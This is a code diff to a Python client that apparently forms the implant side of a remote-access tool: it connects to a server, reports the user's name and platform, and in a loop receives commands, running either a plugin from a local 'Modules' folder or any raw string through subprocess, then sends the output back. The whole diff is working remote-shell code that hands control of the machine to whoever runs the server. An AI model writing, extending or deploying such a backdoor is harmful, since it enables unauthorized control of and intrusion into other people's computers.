@@ -4,6 +4,8 @@ import socket
 import subprocess
 import sys
 import time
+from contextlib import redirect_stdout
+from io import StringIO
 
 from colorama import Fore, init
 
@@ -41,12 +43,47 @@ class Client:
         self.socket.send(self.username.encode())
         self.socket.send('Windows'.encode() if self.platform_type == 'win32' else self.platform_type.encode())
 
+        self.module_folder_name: str = 'Modules'
+        self.module_folder: str = os.path.join(
+            os.path.split(os.path.abspath(__file__))[0],
+            self.module_folder_name
+        )
+
         while True:
             command = self.socket.recv(self.buffer_size).decode()
-            command.split(self.separator)
+            if command.lower() in self.get_commands:
+                output = self.execute_command(command)
+                self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
+            else:
+                output = subprocess.getoutput(command)
+                self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
 
-            output = subprocess.getoutput(command)
-            self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
+    def execute_command(self, module_name: str) -> bytes:
+        stdout = StringIO()
+        module_name = module_name.capitalize()
+
+        with redirect_stdout(stdout):
+            try:
+                getattr(__import__(
+                    f'{self.module_folder_name}.{module_name}',
+                    fromlist=[module_name]),
+                    module_name
+                )()
+
+                stdout = stdout.getvalue().encode()
+                return stdout
+            except Exception as exception:
+                match type(exception).__name__:
+                    case 'ModuleNotFoundError':
+                        return bytes('%s does not exist' % module_name,
+                                     encoding='utf-8')
+                    case _:
+                        return bytes(str(exception),
+                                     encoding='utf-8')
+
+    @property
+    def get_commands(self):
+        return [file[:-3].lower() for file in os.listdir(self.module_folder) if file.endswith('.py')]
 
 
 if __name__ == '__main__':
